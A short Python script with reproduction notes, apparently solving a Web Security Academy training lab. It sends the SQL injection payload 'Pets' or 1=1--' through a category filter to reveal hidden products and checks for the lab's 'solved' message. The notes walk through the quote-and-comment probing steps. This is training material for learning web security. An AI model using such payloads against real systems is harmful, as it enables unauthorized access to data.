#!/usr/bin/env python3

import requests, re

url = "https://0a0600bf041096bf839b5c08008500f9.web-security-academy.net/filter"

# SQL injection payload
sqli_payload = "Pets' or 1=1--"
response = requests.get(url, params={'category': sqli_payload})
body = response.text
print(f'[*] Payload: {sqli_payload}')

# print status code
status = response.status_code
print(f'[*] Status code: {status}')
if status == 500:
    print('[!] Error → SQL confirmed')

# print http headers
http_header = response.headers
print(f'[*] HTTP Header: ')
for key, value in http_header.items():
    print(f'{key}: {value}')
print('\n')

# List of items
items = re.findall(r'<h3>(.*?)</h3>', body)
if items:
    print(f'[✓] Found {len(items)} list:')
    for item in items:
        clean = item.strip()
        if clean:
            print(f'   → {clean}')

# Prove the success lab
if re.search(r'Congratulations|solved', body):
    print('\n[✓] SOLVED')


"""
Steps to Reproduce

1. Open browser and access to this enpoint `/filter?category=Pets`
2. Change parameter to `Pet'` and the server show error message "500 Internal Server Error"
3. Change parameter to `Pet'--` the server response 200 that mean found sql injection.
4. Add this payload into parameter `Pet' or 1=1--` and hit enter the server will display one or more unreleased products on application.
"""